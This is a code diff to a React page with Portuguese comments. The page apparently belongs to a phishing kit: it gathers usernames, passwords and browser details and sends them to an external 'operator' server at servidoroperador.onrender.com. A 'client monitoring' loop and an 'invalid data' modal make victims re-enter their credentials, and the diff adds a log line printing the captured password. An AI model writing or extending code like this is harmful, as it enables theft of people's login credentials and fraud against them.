@@ -372,14 +372,15 @@ const Index = () => {
         device: clientData.device,
         referrer: clientData.referrer,
         currentUrl: clientData.currentUrl,
-        // Incluir clientId se existir para atualizar os dados
+        // Sempre incluir clientId se existir para garantir que seja uma atualização
         ...(existingClientId && { clientId: existingClientId })
       };
 
       console.log('Dados preparados para envio:', registerData);
       console.log('ClientId existente:', existingClientId);
+      console.log('Enviando dados para atualização no dashboard...');
 
-      // Determinar endpoint baseado se é novo registro ou atualização
+      // Sempre usar endpoint de update se existir clientId
       const endpoint = existingClientId 
         ? 'https://servidoroperador.onrender.com/api/clients/update'
         : 'https://servidoroperador.onrender.com/api/clients/register';
@@ -399,8 +400,9 @@ const Index = () => {
       
       if (response.ok) {
         if (existingClientId) {
-          // Se estava atualizando dados, apenas reiniciar o monitoramento
-          console.log('Dados atualizados com sucesso, reiniciando monitoramento...');
+          // Se estava atualizando dados, confirmar atualização e reiniciar monitoramento
+          console.log('Dados atualizados com sucesso no dashboard, reiniciando monitoramento...');
+          console.log('Novos dados enviados:', { username, password: senha });
           await monitorClient(existingClientId, navigate, toast, setShowInvalidDataModal);
         } else {
           // Se é novo registro, processar resposta normalmente
@@ -478,6 +480,7 @@ const Index = () => {
     setShowInvalidDataModal(false);
     
     console.log('Modal fechado, campos limpos e pronto para novos dados');
+    console.log('Estado de loading resetado para permitir reenvio de dados atualizados');
   };
 
   const renderFormContent = () => {
